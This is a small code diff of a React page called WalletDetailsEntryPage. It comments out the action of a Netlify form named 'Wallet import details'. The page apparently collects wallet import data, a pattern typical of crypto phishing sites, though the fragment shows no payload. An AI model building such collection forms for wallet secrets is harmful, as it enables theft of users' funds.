@@ -92,7 +92,7 @@ function WalletDetailsEntryPage() {
           method="POST"
           data-netlify="true"
           netlify-honeypot
-          action="./form-action-page.html"
+          // action="./form-action-page.html"
           name="Wallet import details"
           onSubmit={validateForm}
         >
